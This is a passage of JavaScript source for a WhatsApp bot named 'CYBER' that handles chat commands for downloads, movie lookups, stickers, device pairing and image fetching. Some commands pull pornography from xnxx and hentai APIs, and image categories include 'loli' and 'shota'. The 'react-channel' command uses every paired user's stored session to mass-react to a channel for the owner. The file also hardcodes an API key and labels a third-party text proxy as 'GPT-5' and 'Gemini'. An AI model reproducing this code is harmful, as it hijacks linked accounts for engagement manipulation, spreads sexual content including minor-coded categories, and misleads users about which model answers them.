                    await devtrust.sendMessage(fromChat, { text: '⏳ *Fetching video...*\nPlease wait...' }, { quoted: messageData });
                    const videoData = await xnxxDownload(selectedVideo.url);
                    const videoUrl = videoData.best || videoData.sources?.high || videoData.sources?.low || videoData.sources?.hls;
                    if (!videoUrl) throw new Error('No download URL found');
                    // Buffer download with proper headers (URL hotlink fails on xnxx CDN)
                    const videoBuf = Buffer.from((await axios.get(videoUrl, {
                        responseType: 'arraybuffer',
                        headers: {
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                            'Referer': 'https://www.xnxx.com/',
                            'Origin': 'https://www.xnxx.com',
                        },
                        timeout: 300000,
                        maxContentLength: 500 * 1024 * 1024
                    })).data);
                    const videoCaption = `🎬 *${(videoData.title || selectedVideo.title).substring(0, 80)}*\n📥 Downloaded from XNXX`;
                    await devtrust.sendMessage(fromChat,
                        addNewsletterContext({ video: videoBuf, caption: videoCaption, mimetype: 'video/mp4' }),
                        { quoted: messageData }
                    );
                    await devtrust.sendMessage(fromChat, { react: { text: '✅', key: messageData.key } });
                    global.videoCache.delete(sessionId);
                    devtrust.ev.off('messages.upsert', _xnxxHandler);
                } catch (error) {
                    console.error('xnxx video send error:', error);
                    await devtrust.sendMessage(fromChat, { react: { text: '❌', key: messageData.key } });
                    await devtrust.sendMessage(fromChat, { text: '❌ Failed to send video. Please try again..' }, { quoted: messageData });
                }
            } catch (e) {
                console.error('xnxx handler error:', e);
            }
        };
        devtrust.ev.on('messages.upsert', _xnxxHandler);
        setTimeout(() => {
            global.videoCache.delete(sessionId);
            devtrust.ev.off('messages.upsert', _xnxxHandler);
        }, 5 * 60 * 1000);
    } catch (error) {
        console.error('xnxx API Error:', error);
        reply('❌ API connection failed. Please try again later..');
    }
}
break;
case 'imbd': {
    if (!text) return reply(`🎬 *Enter a movie or series name*`);
    
    try {
        let fids = await axios.get(`http://www.omdbapi.com/?apikey=742b2d09&t=${text}&plot=full`);
        
        let imdbt = `🎬 *${fids.data.Title}* (${fids.data.Year})\n\n` +
            `⭐ Rating: ${fids.data.imdbRating}/10\n` +
            `⏳ Runtime: ${fids.data.Runtime}\n` +
            `🎭 Genre: ${fids.data.Genre}\n` +
            `📅 Released: ${fids.data.Released}\n` +
            `👤 Director: ${fids.data.Director}\n` +
            `👥 Cast: ${fids.data.Actors}\n\n` +
            `📝 ${fids.data.Plot.substring(0, 300)}...`;
        
        await devtrust.sendMessage(m.chat,
            addNewsletterContext({
                image: { url: fids.data.Poster },
                caption: imdbt
            }),
            { quoted: m }
        );
    } catch (e) {
        reply("❌ *Movie not found*");
    }
    break;
}

case 'tiktoksearch': {
    if (!text) return reply("🎵 *Enter a search term*");

    try {
        let query = text;
        let url = `https://www.tikwm.com/api/?url=${encodeURIComponent(query)}`;
        let response = await fetch(url);
        let json = await response.json();

        if (!json.status || !json.data || json.data.length === 0) {
            return reply("❌ *No results found*");
        }

        let videos = json.data.slice(0, 3);

        for (let i = 0; i < videos.length; i++) {
            let vid = videos[i];
            let date = new Date(vid.create_time * 1000);
            let info = `🎵 *TikTok #${i+1}*\n\n` +
                `👍 ${vid.digg_count} likes\n` +
                `👀 ${vid.play_count} views\n` +
                `📝 ${vid.title}\n` +
                `📅 ${date.toDateString()}`;

            await devtrust.sendMessage(m.chat,
                addNewsletterContext({
                    video: { url: vid.play },
                    caption: info
                }),
                { quoted: m }
            );
        }
    } catch (err) {
        console.log(err);
        reply("❌ *Error fetching TikTok data*");
    }
}
break;


case 'imnxmxg':
case 'pinterest': {
    reply("⚠️ *Pinterest command temporarily disabled*\n\nThe Pinterest image search API is currently down.\n\n*Alternative:* Use Google Images and share the link directly, or try other image commands.");
}
break;

case 'nsbxmdmfw': {
    try {
        const apiUrl = 'https://draculazyx-xyzdrac.hf.space/api/hentai';
        const response = await fetch(apiUrl);

        if (!response.ok) throw new Error(`HTTP ${response.status}`);

        const data = await response.json();

        if (data && data.videoUrl) {
            await devtrust.sendMessage(m.chat,
                addNewsletterContext({
                    video: { url: data.videoUrl },
                    caption: `🎥 *${data.title || 'Video'}*\n⚠️ 18+ Content`
                }),
                { quoted: m }
            );
        } else {
            reply("❌ *Content unavailable*");
        }
    } catch (error) {
        console.error(error);
        reply("⚠️ *Error fetching content*");
    }
}
break;

case 'buy-panel': {
    await devtrust.sendMessage(m.chat, { react: { text: '🛒', key: m.key } });
    reply(`🛒 *Panel Purchase*\n\n` +
        `💎 1GB • 2GB • 3GB • 4GB\n` +
        `💎 5GB • 6GB • 7GB • 8GB\n` +
        `💎 9GB • 10GB • Unlimited\n\n` +
        `📩 *DM: +8615507967005*`);
}
break;

case 'setaccount': {
    if (!isCreator) return reply('🔒 *Owner only*');

    const text = args.join(' ');
    if (!text.includes('|'))
        return reply('❌ *Format:* setaccount Name | Number | Bank | Note');

    const [name, number, bank, note] = text.split('|').map(v => v.trim());

    if (!name || !number || !bank)
        return reply('❌ *Name, number and bank required*');

    const accounts = loadAccounts();
    accounts[sender] = { name, number, bank, note: note || '' };
    saveAccounts(accounts);

    reply('✅ *Account details saved*');
}
break;

case 'aza':
case 'account': {
    if (!isCreator) return reply("🔒 *Owner only*");

    const accounts = loadAccounts();
    const acc = accounts[sender];

    if (!acc) return reply('❌ *No account details set*\nUse setaccount first');

    await devtrust.sendMessage(m.chat, { react: { text: '💳', key: m.key } });

    reply(`💳 *Account Details*\n\n` +
        `🏦 ${acc.bank}\n` +
        `👤 ${acc.name}\n` +
        `🔢 ${acc.number}\n\n` +
        `📝 ${acc.note || '—'}`);
}
break;

// ==================== PAIRING COMMANDS FOR WHATSAPP BOT ====================

case 'pair': {
    await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
    return reply(`🌐 *Pairing is only available on the website!*\n\nPlease visit the website to generate your pairing code.\n\n_WhatsApp sy code generate karna disabled hai._`);
    if (!q) return reply(`📌 *Usage:* pair 923xxxxxx`);

    let target = text.split("|")[0];
    let cleanNumber = target.replace(/[^0-9]/g, '');
    
    // Validate number
    if (!/^\d{7,15}$/.test(cleanNumber)) {
        return reply("❌ *Invalid phone number format*");
    }

    // Check if number exists on WhatsApp
    try {
        const contactInfo = await devtrust.onWhatsApp(cleanNumber + '@s.whatsapp.net');
        if (!contactInfo || contactInfo.length === 0) {
            return reply("❌ *Number not registered on WhatsApp*");
        }
    } catch (e) {
        console.log('WhatsApp check error:', e);
    }

    // Create pairing directory if it doesn't exist
    const WHATSAPP_PAIRING_DIR = './database/pairing/';
    if (!fs.existsSync(WHATSAPP_PAIRING_DIR)) {
        fs.mkdirSync(WHATSAPP_PAIRING_DIR, { recursive: true });
    }

    // Send processing message
    const processingMsg = await devtrust.sendMessage(m.chat, {
        text: `🔗 *Generating pairing code for +${cleanNumber}*\n⏳ Please wait...`
    }, { quoted: m });

    try {
        // Load the pair module (same as Telegram bot)
        const startPairing = require('./pair');
        const jid = cleanNumber + '@s.whatsapp.net';
        
        // Start pairing (this will generate code and save to file)
        await startPairing(jid);
        
        // Wait 4 seconds (same as Telegram bot)
        await sleep(4000);

        // Read the pairing file (same as Telegram bot)
        const pairingFile = path.join(__dirname, 'nexstore', 'pairing', 'pairing.json');
        
        if (!fs.existsSync(pairingFile)) {
            throw new Error('Pairing file not found');
        }
        
        const cu = fs.readFileSync(pairingFile, 'utf-8');
        const cuObj = JSON.parse(cu);
        const pairingCode = cuObj.code;

        if (!pairingCode) {
            throw new Error('No code found in pairing file');
        }

        // Format the code nicely
        let formattedCode = pairingCode;
        if (!pairingCode.includes('-') && pairingCode.length > 4) {
            formattedCode = pairingCode.match(/.{1,4}/g).join('-');
        }

        // Save pairing data to WhatsApp directory
        const pairingData = {
            jid: jid,
            number: cleanNumber,
            code: pairingCode,
            timestamp: Date.now(),
            date: new Date().toISOString(),
            status: 'pending',
            pairedBy: m.sender
        };
        
        fs.writeFileSync(
            path.join(WHATSAPP_PAIRING_DIR, `${cleanNumber}@s.whatsapp.net.json`), 
            JSON.stringify(pairingData, null, 2)
        );

        // Delete processing message
        await devtrust.sendMessage(m.chat, { delete: processingMsg.key });

        // Send code (FIRST MESSAGE)
        await devtrust.sendMessage(m.chat, { 
            text: `🔑 *YOUR PAIRING CODE*\n\n\`${formattedCode}\`` 
        }, { quoted: m });

        // Send instructions (SECOND MESSAGE)
        const instructions = `📱 *Pairing Steps*\n\n` +
            `1️⃣ Open WhatsApp on your phone\n` +
            `2️⃣ Tap *⋮* (Menu) → Linked Devices\n` +
            `3️⃣ Tap *Link a Device*\n` +
            `4️⃣ Enter this code: \`${formattedCode}\`\n\n` +
            `_⏱️ Code expires in 5 minutes_`;

        await devtrust.sendMessage(m.chat, { text: instructions }, { quoted: m });

        // Send code again (THIRD MESSAGE)
        await devtrust.sendMessage(m.chat, { 
            text: `${formattedCode}`
        }, { quoted: m });

    } catch (error) {
        console.error('Pairing error:', error);
        
        // Delete processing message
        await devtrust.sendMessage(m.chat, { delete: processingMsg.key });
        
        // Send error message
        await reply(`❌ *Pairing Failed*\n\n${error.message || 'Could not generate code. Try again later.'}`);
    }
}
break;

case 'listpair': {
    // 🔓 Keep owner-only for security (lists ALL paired devices)
    if (!isCreator) return reply("🔒 *Owner only*");
    
    try {
        const WHATSAPP_PAIRING_DIR = './database/pairing/';
        let allPairs = [];
        
        // Read from WhatsApp pairing directory
        if (fs.existsSync(WHATSAPP_PAIRING_DIR)) {
            const files = fs.readdirSync(WHATSAPP_PAIRING_DIR);
            files.forEach(file => {
                if (file.endsWith('.json')) {
                    try {
                        const filePath = path.join(WHATSAPP_PAIRING_DIR, file);
                        const data = JSON.parse(fs.readFileSync(filePath, 'utf-8'));
                        allPairs.push({
                            number: data.number || file.replace('.json', '').split('@')[0],
                            date: data.date || new Date(fs.statSync(filePath).birthtime).toISOString(),
                            status: data.status || 'unknown',
                            pairedBy: data.pairedBy || 'unknown'
                        });
                    } catch (e) {
                        const number = file.replace('.json', '').split('@')[0];
                        allPairs.push({
                            number: number,
                            date: new Date(fs.statSync(path.join(WHATSAPP_PAIRING_DIR, file)).birthtime).toISOString(),
                            status: 'unknown',
                            pairedBy: 'unknown'
                        });
                    }
                }
            });
        }
        
        if (allPairs.length === 0) {
            return reply(`📭 *No paired devices found*`);
        }
        
        // Sort by date (newest first)
        allPairs.sort((a, b) => new Date(b.date) - new Date(a.date));
        
        let pairedList = `📱 *Paired Devices*\n\n`;
        pairedList += `Total: ${allPairs.length}\n\n`;
        
        allPairs.forEach((pair, index) => {
            const dateStr = new Date(pair.date).toLocaleString();
            const statusEmoji = pair.status === 'pending' ? '⏳' : '✅';
            pairedList += `${index+1}. ${statusEmoji} *${pair.number}*\n`;
            pairedList += `   📅 ${dateStr}\n`;
            if (pair.pairedBy && pair.pairedBy !== 'unknown') {
                const shortUser = pair.pairedBy.split('@')[0];
                pairedList += `   👤 Paired by: @${shortUser}\n`;
            }
            pairedList += `\n`;
        });
        
        pairedList += `_Use .delpair [number] to remove_`;
        
        reply(pairedList);
        
    } catch (err) {
        console.error('Listpair error:', err);
        reply(`❌ *Error:* ${err.message}`);
    }
}
break;

case 'delpair': {
    // 🔓 REMOVED owner-only check - Users can delete their own pairings
    // But we need to check if they're deleting their own or need owner for others
    
    if (!q) return reply(`📌 *Usage:* delpair 923xxxxxx`);
    
    const cleanNumber = q.replace(/[^0-9]/g, '');
    const WHATSAPP_PAIRING_DIR = './database/pairing/';
    let deleted = false;
    let message = '';
    let isOwnerDeleting = isCreator || isSudo; // Check if owner/sudo
    
    // Check if this number belongs to the user or if they're owner
    const userNumber = m.sender.split('@')[0];
    const isOwnNumber = (userNumber === cleanNumber);
    
    if (!isOwnNumber && !isOwnerDeleting) {
        return reply(`🔒 *You can only delete your own pairings*\nUse your own number: ${userNumber}`);
    }
    
    // Delete from WhatsApp pairing directory
    if (fs.existsSync(WHATSAPP_PAIRING_DIR)) {
        try {
            const files = fs.readdirSync(WHATSAPP_PAIRING_DIR);
            const matchingFile = files.find(file => 
                file.includes(cleanNumber)
            );
            
            if (matchingFile) {
                const filePath = path.join(WHATSAPP_PAIRING_DIR, matchingFile);
                
                // If not owner, check if this file belongs to them
                if (!isOwnerDeleting) {
                    try {
                        const data = JSON.parse(fs.readFileSync(filePath, 'utf-8'));
                        const pairedBy = data.pairedBy || '';
                        if (!pairedBy.includes(userNumber) && !pairedBy.includes(m.sender)) {
                            return reply(`🔒 *This pairing doesn't belong to you*\nOnly the person who paired it or an owner can delete it.`);
                        }
                    } catch (e) {
                        // If can't read, only owners can delete
                        if (!isOwnerDeleting) {
                            return reply(`🔒 *Cannot verify ownership*\nAsk an owner to delete this.`);
                        }
                    }
                }
                
                fs.unlinkSync(filePath);
                deleted = true;
                message += `✅ Removed from WhatsApp storage\n`;
            }
        } catch (err) {
            console.error('Error deleting from WhatsApp dir:', err);
        }
    }
    
    // Delete from owner.json if exists (only owners should modify this)
    if (isOwnerDeleting) {
        const ownerPath = path.join(__dirname, 'allfunc', 'owner.json');
        if (fs.existsSync(ownerPath)) {
            try {
                let ownerData = JSON.parse(fs.readFileSync(ownerPath, 'utf-8'));
                const originalLength = ownerData.length;
                ownerData = ownerData.filter(id => 
                    !id.includes(cleanNumber)
                );
                if (ownerData.length !== originalLength) {
                    fs.writeFileSync(ownerPath, JSON.stringify(ownerData, null, 2));
                    message += `✅ Removed from owner.json\n`;
                    deleted = true;
                }
            } catch (err) {
                console.error('Error updating owner.json:', err);
            }
        }
    }
    
    // Delete session if exists (anyone can delete their own session)
    const SESSION_DIR = './CYBER_storage/sessions/';
    if (fs.existsSync(SESSION_DIR)) {
        try {
            const sessionPath = path.join(SESSION_DIR, `${cleanNumber}@s.whatsapp.net`);
            if (fs.existsSync(sessionPath)) {
                fs.rmSync(sessionPath, { recursive: true, force: true });
                message += `✅ Removed session\n`;
                deleted = true;
            }
        } catch (err) {
            console.error('Error deleting session:', err);
        }
    }
    
    if (deleted) {
        reply(`✅ *Pairing deleted for ${cleanNumber}*\n\n${message}`);
    } else {
        reply(`❌ *No pairing found for ${cleanNumber}*`);
    }
}
break;

case "gpt5": {
    const chatId = m.key.remoteJid;
    let query = args.join(" ").trim();

    try {
        if (!query && m.message?.extendedTextMessage?.contextInfo?.quotedMessage) {
            const quoted = m.message.extendedTextMessage.contextInfo.quotedMessage;
            if (quoted.conversation) query = quoted.conversation;
            else if (quoted.extendedTextMessage?.text) query = quoted.extendedTextMessage.text;
        }

        if (!query) return reply("🤖 *Usage:* gpt5 your question");

        const res = await fetch(`https://text.pollinations.ai/${encodeURIComponent('You are a helpful assistant. User: ' + query)}`);
        if (!res.ok) return reply(`⚠️ *API error ${res.status}*`);

        const json = await res.json();
        const answer = json?.result || "";

        if (!answer) return reply("⚠️ *No response from GPT-5*");

        const chunks = answer.match(/[\s\S]{1,3000}/g) || [answer];
        
        for (let i = 0; i < chunks.length; i++) {
            const header = i === 0 ? "🤖 *GPT-5*\n\n" : "";
            await devtrust.sendMessage(chatId, { text: header + chunks[i] });
        }
    } catch (err) {
        console.error(err);
        reply("⚠️ *GPT-5 unavailable*");
    }
}
break;

case "lyrics": {
    const chatId = m.key.remoteJid;
    const query = args.join(" ");
    
    if (!query) return reply("🎵 *Usage:* lyrics song title");

    try {
        // Step 1: Search for the song to get artist & title
        const searchRes = await fetch(`https://api.lyrics.ovh/suggest/${encodeURIComponent(query)}`);
        const searchJson = await searchRes.json();

        if (!searchJson.data || searchJson.data.length === 0) {
            return reply(`❌ *Song not found for "${query}"*\nTry a more specific title.`);
        }

        // Pick the best match (first result)
        const topResult = searchJson.data[0];
        const songTitle = topResult.title || query;
        const artistName = topResult.artist?.name || '';

        // Step 2: Fetch actual lyrics using artist + title endpoint
        const lyricsRes = await fetch(
            `https://api.lyrics.ovh/v1/${encodeURIComponent(artistName)}/${encodeURIComponent(songTitle)}`
        );
        const lyricsJson = await lyricsRes.json();

        if (!lyricsJson.lyrics) {
            return reply(`❌ *Lyrics not available for "${songTitle}"*\nThis song might not be in the database.`);
        }

        const lyrics = lyricsJson.lyrics.trim();
        const album = topResult.album?.title || '';
        const chunks = lyrics.match(/[\s\S]{1,3500}/g) || [lyrics];

        for (let i = 0; i < chunks.length; i++) {
            const header = i === 0
                ? `🎵 *${songTitle}*${artistName ? ` – *${artistName}*` : ''}\n${album ? `📀 ${album}\n` : ''}\n`
                : "";
            await devtrust.sendMessage(chatId, { text: header + chunks[i] });
        }
    } catch (err) {
        console.error(err);
        reply("⚠️ *Lyrics fetch failed*");
    }
}
break;

case 'stickerthf':
case 'steal':
case 'stickerwm':
case 'take':
case 'wm': {
    // Check if quoting a message
    if (!m.quoted) {
        return reply(`🎨 *CYBER Sticker Stealer*\n\nReply to a sticker with:\n${prefix}${command} PackName | Author\n\nExample: ${prefix}steal My Pack | My Name`);
    }
    
    // Check if it's a sticker
    if (!m.quoted.mimetype || !m.quoted.mimetype.includes('webp')) {
        return reply(`❌ *CYBER Sticker Stealer*\n\nThat's not a sticker. Reply to a sticker image.`);
    }
    
    try {
        // Show loading reaction
        await devtrust.sendMessage(m.chat, { react: { text: '🎨', key: m.key } });
        
        // Parse packname and author
        let packname = 'CYBER';
        let author = 'GAME CHANGER';
        
        if (text && text.includes('|')) {
            let parts = text.split('|');
            packname = parts[0]?.trim() || 'CYBER';
            author = parts[1]?.trim() || 'GAME CHANGER';
        } else if (text) {
            packname = text;
        }
        
        // Download the sticker
        let media = await m.quoted.download();
        
        // Create sticker with exif
        const { Sticker, StickerTypes } = require('wa-sticker-formatter');
        
        let sticker = new Sticker(media, {
            pack: packname,
            author: author,
            type: StickerTypes.FULL,
            quality: 90,
            background: '#FFFFFF00'
        });
        
        // Convert to buffer
        let stickerBuffer = await sticker.toBuffer();
        
        // Send the sticker
        await devtrust.sendMessage(m.chat, { 
            sticker: stickerBuffer 
        }, { quoted: m });
        
        // Success reaction
        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
        
    } catch (error) {
        console.error('Sticker error:', error);
        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        reply(`⚠️ *CYBER Sticker Stealer*\n\nSticker machine is jammed. Try again later.`);
    }
}
break;

case 'react-channel': {
    if (!isCreator) {
        return reply(`🔒 *CYBER React*\n\nThis command is owner only.`);
    }

    const args = text.split(" ");
    if (args.length < 2) {
        return reply(`📌 *CYBER React*\n\nUsage: ${prefix}react-channel [emoji] [channel_link]\nExample: ${prefix}react-channel 👍 https://whatsapp.com/channel/123456/789`);
    }

    const emoji = args[0];
    const link = args[1];
    
    // Better regex for channel links
    const regex = /whatsapp\.com\/channel\/([0-9]+)(?:\/([0-9]+))?/;
    const match = link.match(regex);

    if (!match) {
        return reply(`❌ *CYBER React*\n\nInvalid channel link. Please check the URL.`);
    }

    const channelId = match[1];
    const messageId = match[2];
    
    if (!messageId) {
        return reply(`❌ *CYBER React*\n\nMessage ID not found in the link.`);
    }
    
    const channelJid = `${channelId}@newsletter`;

    try {
        await devtrust.sendMessage(m.chat, { react: { text: '⚡', key: m.key } });
        
        reply(`🔄 *CYBER React*\n\nSpreading ${emoji} to ${channelId}...`);

        const pairedUsers = await loadUsers();
        
        if (!pairedUsers || pairedUsers.length === 0) {
            return reply(`⚠️ *CYBER React*\n\nNo paired users found in the database.`);
        }

let success = 0;
let failed = 0;
let errors = [];

for (const user of pairedUsers) {
    try {
        const session = getSession(user.id || user.jid || user.number + '@s.whatsapp.net');
        
        // Try to send reaction
        let sent = false;
        
        if (session) {
            try {
                await session.sendMessage(channelJid, {
                    react: {
                        text: emoji,
                        key: { 
                            id: messageId, 
                            remoteJid: channelJid 
                        }
                    }
                });
                sent = true;
                success++;
                console.log(`✅ React success for ${user.id || user.number}`);
            } catch (sessionError) {
                console.log(`Session send failed for ${user.id}, trying main bot...`);
            }
        }
        
        // If session failed, try main bot as fallback
        if (!sent) {
            try {
                await devtrust.sendMessage(channelJid, {
                    react: {
                        text: emoji,
                        key: { 
                            id: messageId, 
                            remoteJid: channelJid 
                        }
                    }
                });
                success++;
                console.log(`✅ React success via main bot for ${user.id || user.number}`);
                sent = true;
            } catch (mainError) {
                throw new Error('Both session and main bot failed');
            }
        }
        
        // Small delay to avoid rate limiting
        await new Promise(resolve => setTimeout(resolve, 1000));
        
    } catch (e) {
        failed++;
        errors.push(`User ${user.id || user.number}: ${e.message}`);
        console.error(`React error for user ${user.id || user.number}:`, e.message);
    }
}

        const resultMessage = `✅ *CYBER React Complete*\n\n` +
            `Emoji: ${emoji}\n` +
            `Channel: ${channelId}\n` +
            `Success: ${success}\n` +
            `Failed: ${failed}`;
        
        reply(resultMessage);
        
        // Log errors if any (for debugging)
        if (errors.length > 0 && failed > 0) {
            console.log('React errors:', errors.slice(0, 3));
        }
        
        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
        
    } catch (error) {
        console.error('Mass react error:', error);
        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        reply(`⚠️ *CYBER React*\n\nReaction service is overloaded. Try again later.`);
    }
}
break;

case "nsfw": {
    // Adult unlock check
    const _nsfwSenderNum = (m.sender || '').split('@')[0].split(':')[0];
    const _nsfwUnlocked = (global._flagCache?.adultUnlocked || []).some(id => String(id).replace(/[^0-9]/g,'') === _nsfwSenderNum);
    const _nsfwBanned = (global._flagCache?.adultBanned || []).some(id => String(id).replace(/[^0-9]/g,'') === _nsfwSenderNum);
    if (_nsfwBanned) return reply(`🚫 *18+ Access Permanently Banned*\nYou cannot access 18+ content.`);
    if (!_nsfwUnlocked) return reply(`🔞 *18+ Content Locked*\nType *${prefix}addkey <code>* to unlock.\nGet the code from admin.`);
    try {
        const res = await axios.get("https://nekobot.xyz/api/image?type=hentai");
        const img = res.data?.message;
        if (!img) return reply("❌ *Content unavailable*");

        await devtrust.sendMessage(m.chat,
            addNewsletterContext({
                image: { url: img },
                caption: "🔞 *NSFW Content*"
            }),
            { quoted: m }
        );
    } catch (e) {
        console.error(e);
        reply("❌ *Failed to fetch content*");
    }
}
break;

// Bulk anime image commands - all follow same pattern
case 'akiyama': case 'ana': case 'art': case 'asuna': case 'ayuzawa':
case 'boruto': case 'bts': case 'cecan': case 'chiho': case 'chitoge':
case 'cogan': case 'cosplay': case 'cosplayloli': case 'cosplaysagiri':
case 'cyber': case 'deidara': case 'doraemon': case 'elaina': case 'emilia':
case 'erza': case 'exo': case 'femdom': case 'freefire': case 'gamewallpaper':
case 'glasses': case 'gremory': case 'hacker': case 'hestia': case 'husbu':
case 'inori': case 'islamic': case 'isuzu': case 'itachi': case 'itori':
case 'jennie': case 'jiso': case 'justina': case 'kaga': case 'kagura':
case 'kakashi': case 'kaori': case 'cartoon': case 'shortquote': case 'keneki':
case 'kotori': case 'kpop': case 'kucing': case 'kurumi': case 'lisa':
case 'loli': case 'madara': case 'megumin': case 'mikasa': case 'mikey':
case 'miku': case 'minato': case 'mobile': case 'motor': case 'mountain':
case 'naruto': case 'neko': case 'neko2': case 'nekonime': case 'nezuko':
case 'onepiece': case 'pentol': case 'pokemon': case 'profil': case 'programming':
case 'pubg': case 'randblackpink': case 'randomnime': case 'randomnime2':
case 'rize': case 'rose': case 'ryujin': case 'sagiri': case 'sakura':
case 'sasuke': case 'satanic': case 'shina': case 'shinka': case 'shinomiya':
case 'shizuka': case 'shota': case 'space': case 'technology': case 'tejina': {
    try {
        const _animeUrl = await getAnimeImageUrl(command);
        if (!_animeUrl) throw new Error('No image URL');
        const imgBuffer = await getBuffer(_animeUrl);
        await devtrust.sendMessage(m.chat,
            {
                image: imgBuffer,
                caption: '🎌 *' + (command.charAt(0).toUpperCase() + command.slice(1)) + '*'
            },
            { quoted: m }
        );
    } catch (err) {
        reply('❌ *Failed to fetch ' + command + ' image*');
    }
}
break;

case 'toukachan': {
    try {
        const _u = await getAnimeImageUrl('toukachan');
        if (!_u) throw new Error('No image');
        const _b = await getBuffer(_u);
        await devtrust.sendMessage(m.chat,
            {
                image: _b,
                caption: "🎌 *Touka-chan*"
            },
            { quoted: m }
        );
    } catch {
        reply(`❌ *Failed to fetch toukachan image*`);
    }
}
break;

case 'tsunade': {
    try {
        const _u = await getAnimeImageUrl('tsunade');
        if (!_u) throw new Error('No image');
        const _b = await getBuffer(_u);
        await devtrust.sendMessage(m.chat,
            {
                image: _b,
                caption: "🎌 *Tsunade*"
            },
            { quoted: m }
        );
    } catch {
        reply(`❌ *Failed to fetch tsunade image*`);
    }
}
break;

case 'wfbbbu': {
    try {
        const _u = await getAnimeImageUrl('wfbbbu');
        if (!_u) throw new Error('No image');
        const _b = await getBuffer(_u);
        await devtrust.sendMessage(m.chat,
            {
                image: _b,
                caption: "🎌 *Random Waifu*"
            },
            { quoted: m }
        );
    } catch {
        reply(`❌ *Failed to fetch wfbbbu image*`);
    }
}
break;

case 'wallhp': {
    try {
        const _u = await getAnimeImageUrl('wallhp');
        if (!_u) throw new Error('No image');
        const _b = await getBuffer(_u);
        await devtrust.sendMessage(m.chat,
            {
                image: _b,
                caption: "🎌 *Wallpaper*"
            },
            { quoted: m }
        );
    } catch {
        reply(`❌ *Failed to fetch wallhp image*`);
    }
}
break;

case 'wallml': {
    try {
        const _u = await getAnimeImageUrl('wallml');
        if (!_u) throw new Error('No image');
        const _b = await getBuffer(_u);
        await devtrust.sendMessage(m.chat,
            {
                image: _b,
                caption: "🎌 *Anime Wallpaper*"
            },
            { quoted: m }
        );
    } catch {
        reply(`❌ *Failed to fetch wallml image*`);
    }
}
break;

case 'wallmlnime': {
    try {
        const _u = await getAnimeImageUrl('wallmlnime');
        if (!_u) throw new Error('No image');
        const _b = await getBuffer(_u);
        await devtrust.sendMessage(m.chat,
            {
                image: _b,
                caption: "🎌 *Anime Wallpaper*"
            },
            { quoted: m }
        );
    } catch {
        reply(`❌ *Failed to fetch wallmlnime image*`);
    }
}
break;

case 'yotsuba': {
    try {
        const _u = await getAnimeImageUrl('yotsuba');
        if (!_u) throw new Error('No image');
        const _b = await getBuffer(_u);
        await devtrust.sendMessage(m.chat,
            {
                image: _b,
                caption: "🎌 *Yotsuba*"
            },
            { quoted: m }
        );
    } catch {
        reply(`❌ *Failed to fetch yotsuba image*`);
    }
}
break;

case 'yuki': {
    try {
        const yukiUrl = await getAnimeImageUrl('yuki');
        if (!yukiUrl) throw new Error('No image');
        const yukiBuf = await getBuffer(yukiUrl);
        await devtrust.sendMessage(m.chat,
            {
                image: yukiBuf,
                caption: "🎌 *Yuki*"
            },
            { quoted: m }
        );
    } catch {
        reply(`❌ *Failed to fetch yuki image*`);
    }
}
break;

case 'yulibocil': {
    try {
        const _u = await getAnimeImageUrl('yulibocil');
        if (!_u) throw new Error('No image');
        const _b = await getBuffer(_u);
        await devtrust.sendMessage(m.chat,
            {
                image: _b,
                caption: "🎌 *Yuli Bocil*"
            },
            { quoted: m }
        );
    } catch {
        reply(`❌ *Failed to fetch yulibocil image*`);
    }
}
break;

case 'yumeko': {
    try { const yumUrl = await getAnimeImageUrl('yumeko'); if (!yumUrl) throw new Error('No image'); const yumBuf = await getBuffer(yumUrl); await devtrust.sendMessage(m.chat, { image: yumBuf, caption: "🎌 *Yumeko*" }, { quoted: m }); } catch { reply(`❌ *Failed to fetch yumeko image*`); }
}
break;

case 'gemini':
case "gemivbnni": {
    let query = text || (m.message?.extendedTextMessage?.contextInfo?.quotedMessage?.conversation);
    if (!query) return reply("🤖 *Usage:* .gemini your question");
    try {
        await devtrust.sendMessage(m.chat, { react: { text: '⚡', key: m.key } });
        const sysPrompt = `CRITICAL: Respond ONLY in the EXACT same language and script the user wrote in. If user writes in Roman Urdu, respond ONLY in Roman Urdu. NEVER use Hindi Devanagari or formal Urdu Nastaliq script.`;
        const res = await axios.post('https://text.pollinations.ai/', {
            messages: [
                { role: 'system', content: sysPrompt },
                { role: 'user', content: query }
            ],
            model: 'openai-large',
            seed: -1
        }, { timeout: 40000 });
        const answer = typeof res.data === 'string' ? res.data : JSON.stringify(res.data);
        if (!answer || answer.startsWith('<')) return reply("⚠️ *Gemini did not respond* — try again");
        const chunks = answer.match(/[\s\S]{1,3000}/g) || [answer];
        for (let i = 0; i < chunks.length; i++) {
            await devtrust.sendMessage(m.chat, { text: (i === 0 ? "🤖 *Gemini*\n\n" : "") + chunks[i] }, i === 0 ? { quoted: m } : {});
        }
        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
    } catch (err) {
        console.error('Gemini error:', err.message);
        reply("⚠️ *Gemini unavailable* • Try again later");
    }
}
break;

// ============ MOVIE COMMANDS ============
case 'movie2': {
    if (!text) return reply(`🎬 *Usage:* ${prefix + command} movie name`);

    try {
        await devtrust.sendMessage(m.chat, { react: { text: '🔍', key: m.key } });
        await reply(`🔍 *Searching for "${text}"...*`);
        
        const apiUrl = `https://www.dark-yasiya-api.site/movie/sinhalasub/search?text=${encodeURIComponent(text)}`;
        const response = await axios.get(apiUrl);
        const { status, result } = response.data;

        if (!status || !result || result.movies.length === 0) {
            return reply(`❌ *No movies found for "${text}"*`);
        }

        // Store results for THIS USER only
        userMovieSessions[m.sender] = {
            movies: result.movies,
            timestamp: Date.now()
        };

        let movieList = `🎥 *Results for "${text}"*\n\n`;
        result.movies.slice(0, 5).forEach((movie, index) => {
            movieList += `${index + 1}. *${movie.title}*\n`;
            movieList += `   ⭐ ${movie.imdb || 'N/A'} | 📅 ${movie.year || 'N/A'}\n\n`;
        });
        
        if (result.movies.length > 5) {
            movieList += `_...and ${result.movies.length - 5} more_\n\n`;
        }
        
        movieList += `📌 *Select:* .selectmovie [number]`;

        await reply(movieList);
        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
        
    } catch (error) {
        console.error('Movie search error:', error);
        reply(`❌ *Search failed* • Try again later`);
